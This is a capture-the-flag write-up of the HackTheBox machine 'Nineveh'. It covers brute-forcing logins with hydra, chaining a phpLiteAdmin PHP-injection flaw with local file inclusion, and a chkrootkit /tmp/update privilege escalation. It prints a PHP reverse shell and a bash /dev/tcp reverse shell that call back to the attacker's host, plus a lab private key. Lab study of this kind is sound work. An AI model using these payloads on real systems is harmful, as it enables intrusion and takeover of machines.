---
layout: post
title: "nineveh"
date: 2025-09-07 
categories: OSCP Playlist
---
# nineveh

# Summary

- ffuf to find hidden dir in both HTTP and HTTPS sites
- found encrypted image hiding private and public key for ssh user
- hydra to bruteforce login in both HTTP & HTTPS
- HTTP site has LFI once logged in
- HTTPS uses phpliteadmin, which we could create database with php code
- Together with LFI, we were able to execute php reverse shell to get foothold as www-data
- process enumeration find knockd, requiring port knocking to enable ssh
- checked configuration to find sequence of knockd to enable ssh
- irregular /report in /, find out it’s running chkrootkit
- local priv esc chkrootkit to get root shell from /tmp/update

# Attack Path

First, let’s enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/nineveh 10.10.10.43

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

There is a HTTP and HTTPS site. Let’s visit both:

## HTTP

![image.png]({{ site.baseurl }}/assets/nineveh/image.png)

Nothing in page source. Let’s fuzz:

```bash
feroxbuster -u http://10.10.10.43

200      GET        5l       25w      178c http://10.10.10.43/
404      GET        9l       33w      287c http://10.10.10.43/Reports%20List
404      GET        9l       33w      285c http://10.10.10.43/modern%20mom
301      GET        9l       28w      315c http://10.10.10.43/department => http://10.10.10.43/department/
301      GET        9l       28w      319c http://10.10.10.43/department/css => http://10.10.10.43/department/css/
301      GET        9l       28w      321c http://10.10.10.43/department/files => http://10.10.10.43/department/files/

```

If we visit the department subdir, we get redirected to a login page:

![image.png]({{ site.baseurl }}/assets/nineveh/image%201.png)

Let’s try default credentials and SQLi. Looking at the page source:

```bash
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

```bash
#Login attempt:
admin:admin

' OR '1'='1'-- -
```

We know mysql is on the backend. Let’s try using sqlmap:

```bash
sqlmap -r req.txt --batch
```

## HTTPS

![image.png]({{ site.baseurl }}/assets/nineveh/image%202.png)

Page source:

```bash
<center><img src="ninevehForAll.png" /></center>
```

Let’s also fuzz this:

```bash
feroxbuster -u https://10.10.10.43 -k

301      GET        9l       28w      309c https://10.10.10.43/db => https://10.10.10.43/db/
200      GET     2246l    12546w  1016797c https://10.10.10.43/ninevehForAll.png
200      GET        1l        3w       49c https://10.10.10.43/

ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://10.10.10.43/FUZZ -ic

                        [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 16ms]
db                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 29ms]
                        [Status: 200, Size: 49, Words: 3, Lines: 2, Duration: 21ms]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 17ms]
secure_notes            [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 19ms]
```

![image.png]({{ site.baseurl }}/assets/nineveh/image%203.png)

We search up default creds for this:

```bash
creds search phpliteadmin

+--------------+----------+----------+
| Product      | username | password |
+--------------+----------+----------+
| phpliteadmin | <blank>  |  admin   |
+--------------+----------+----------+
```

Does not work. Let’s search up vulnerabilities associated with this version:

We come across this vulnerability, a php code injection. https://www.exploit-db.com/exploits/24044

However, we do not have access to the db so the exploit won’t work.

Let’s fuzz again:

```bash
https://10.10.10.43/secure_notes
```

We also visit this site:

![image.png]({{ site.baseurl }}/assets/nineveh/image%204.png)

Let’s download the image and inspect further:

```bash
exiftool nineveh.png

ExifTool Version Number         : 13.25
File Name                       : nineveh.png
Directory                       : .
File Size                       : 2.9 MB
File Modification Date/Time     : 2025:09:07 10:22:48+01:00
File Access Date/Time           : 2025:09:07 10:22:48+01:00
File Inode Change Date/Time     : 2025:09:07 10:22:48+01:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1497
Image Height                    : 746
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Software                        : Shutter
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 1497x746
Megapixels                      : 1.1
```

Not much. Let’s see if it employed any steganography tricks.

```bash
strings -n 8 nineveh.png

<SNIP>
www-data
www-data
secret/nineveh.priv
00000003213
13126045656
www-data
www-data
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
00000000620
13126060277
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb

```

Seems we got the private and public key for ssh login for user amrois. Note that another tool we could’ve used here is binwalk.

Also data that keeps repeating, let’s make a note:

```bash
13126060277
www-data
```

We try the numbers and username amrois and see whether that logs us in in any of the sites. Did not work.

Let’s run another scan:

```bash
rustscan -a 10.10.10.43 --ulimit 5000
```

No additional ports found.

At this point, we just have to attempt to bruteforce it. Let’s us hydra. First copy the parameters form burp:

![image.png]({{ site.baseurl }}/assets/nineveh/image%205.png)

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:F=Incorrect" -t 64
```

Hydra forces us to do a user so -l is speicified

```bash
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
```

We are in. Before we move on, we should see if the same password works on the http site as well. Nope. Let’s also attempt to bruteforce it while we dive in the phpliteadmin site.

The burp request is:

```bash
POST /department/login.php HTTP/1.1
username=admin&password=password123

hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:F=Invalid" -t 64

[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t

```

We are also in.

Going back to phpliteadmin:

![image.png]({{ site.baseurl }}/assets/nineveh/image%206.png)

Looking back at the exploit we found earlier, we can try that:

```bash
Description:

phpliteadmin.php#1784: 'Creating a New Database' => 
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php
```

We create hack.php on our left hand side. Then we click into it:

![image.png]({{ site.baseurl }}/assets/nineveh/image%207.png)

Now let’s create a table:

![image.png]({{ site.baseurl }}/assets/nineveh/image%208.png)

Now insert into the new field default value our php code:

![image.png]({{ site.baseurl }}/assets/nineveh/image%209.png)

![image.png]({{ site.baseurl }}/assets/nineveh/image%2010.png)

Trying to change the path of our db:

![image.png]({{ site.baseurl }}/assets/nineveh/image%2011.png)

We find out the path we are on. Let’s try to change it to that:

![image.png]({{ site.baseurl }}/assets/nineveh/image%2012.png)

We can’t access the page. 

The HTTP page:

![image.png]({{ site.baseurl }}/assets/nineveh/image%2013.png)

Clicking on Notes reveal:

```bash
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois

```

The URL used to request this note is:

```bash
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
```

Let’s see if there is an LFI here. Let’s send it to repeater. Some simple fuzzing did not work:

```bash
notes=/etc/passwd
notes=../../../../etc/passwd
notes=....//....//....//....//....//etc/passwd
notes=files/../../../../etc/passwd
```

Let’s try fuzzing it:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://10.10.10.43/department/manage.php?notes=FUZZ' -fs 0

```

Let’s try php filters:

```bash
http://10.10.10.43/department/manage.php?notes=php://filter/read=convert.base64-encode/resource=manage.php
```

Does not work. File name too long. Let’s try to fuzz and look for other files within the files dir:

```bash
http://10.10.10.43/department/manage.php?notes=files/anhfile.php
```

Nothing. Maybe there is a filter that requires the file name to be ninevehNotes:

```bash
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes

http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes
```

We get this error:

![image.png]({{ site.baseurl }}/assets/nineveh/image%2014.png)

We know that if php is using include(), code can be executed, or even query a remote URL. This mean we can point to our db from here as long as ninevehNotes is in the name.

```bash
http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes2.php
```

It worked:

![image.png]({{ site.baseurl }}/assets/nineveh/image%2015.png)

Let’s change the php to a reverse shell:

```bash
<?php $sock=fsockopen("10.10.16.7",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```

![image.png]({{ site.baseurl }}/assets/nineveh/image%2016.png)

We now have shell:

![image.png]({{ site.baseurl }}/assets/nineveh/image%2017.png)

Let’s upgrade our shell and look at running processes:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

ps -ef --forest
```

We see this:

```bash
root      1292     1  0 03:51 ?        00:00:58 /usr/sbin/knockd -d -i ens160

```

That process is a **port-knocking service** running as root, monitoring network traffic on `ens160`. Once someone sends the right “knock” sequence, it will dynamically open ports (commonly SSH) using iptables/firewalld rules.

We can find out how we should “knock” from configuration file:

```bash
cat /etc/knockd.conf

[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```

Let’s knock from our host:

```bash
knock 10.10.10.43 571 290 911

```

Now let’s check again:

```bash
nmap -p 22 10.10.10.43     
                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 12:03 BST
Nmap scan report for 10.10.10.43
Host is up (0.019s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
```

Let’s login as amrois now with our private key:

```bash
chmod 600 nineveh.priv

ssh -i nineveh.priv amrois@10.10.10.43
```

We are sshed in:

![image.png]({{ site.baseurl }}/assets/nineveh/image%2018.png)

We still don’t know amrois’ password so we can’t list sudo privilege. No hidden files and we are not in a privileged group.

Checking our cron jobs:

```bash
crontab -l

*/10 * * * * /usr/sbin/report-reset.sh
```

Let’s see what this shell script is:

```bash
cat /usr/sbin/report-reset.sh

#!/bin/bash

rm -rf /report/*.txt
```

```bash
ls -l /usr/sbin/report-reset.sh

-rwxr-x--- 1 amrois amrois 34 Jul  2  2017 /usr/sbin/report-reset.sh
```

It periodically deletes everything in the /report dir. Looking in the dir, we find report files. An example has content:

```bash
arching for AjaKit rootkit default files and dirs... nothing found    
Searching for zaRwT rootkit default files and dirs... nothing found                                                                              
Searching for Madalin rootkit default files... nothing found            
Searching for Fu rootkit default files... nothing found                 
Searching for ESRK rootkit default files... nothing found                                                                                        
Searching for rootedoor... nothing found                                
Searching for ENYELKM rootkit default files... nothing found            
Searching for common ssh-scanners default files... nothing found        
Searching for suspect PHP files...                                      
/var/tmp/hack.php                                                       
/var/tmp/ninevehNotes2.php                                              
/var/tmp/ninevehNotes.php                                               
                                                                        
Searching for anomalies in shell history files... Warning: `//root/.bash_history' is linked to another file
Checking `asp'... not infected                                          
Checking `bindshell'... not infected                                    
Checking `lkm'... not tested: can't exec                                
Checking `rexedcs'... not found                                         
Checking `sniffer'... not tested: can't exec ./ifpromisc
Checking `w55808'... not infected                                       
Checking `wted'... not tested: can't exec ./chkwtmp
Checking `scalper'... not infected                                      
Checking `slapper'... not infected                                      
Checking `z2'... not tested: can't exec ./chklastlog
Checking `chkutmp'... not tested: can't exec ./chkutmp        
Checking `OSX_RSPLUG'... not infected 
```

Searching up the output on ChatGPT, and asking what program would produce this, tells us it’s from chkrootkit, which scans for signs of rootkit.

```bash
Searching for Madalin rootkit default files... nothing found            
Searching for Fu rootkit default files... nothing found                 
Searching for ESRK rootkit default files... nothing found   
```

We search up chkrootkit and find this exploit:

[https://www.rapid7.com/db/modules/exploit/unix/local/chkrootkit/](https://www.rapid7.com/db/modules/exploit/unix/local/chkrootkit/)

```bash
Description
Chkrootkit before 0.50 will run any executable file named /tmp/update
as root, allowing a trivial privilege escalation.
```

Let’s create an executable in /tmp/update and let it execute a reverse shell:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.7/4444 0>&1'
```

After a while, we get root:

```bash
nc -lnvp 4444
```

![image.png]({{ site.baseurl }}/assets/nineveh/image%2019.png)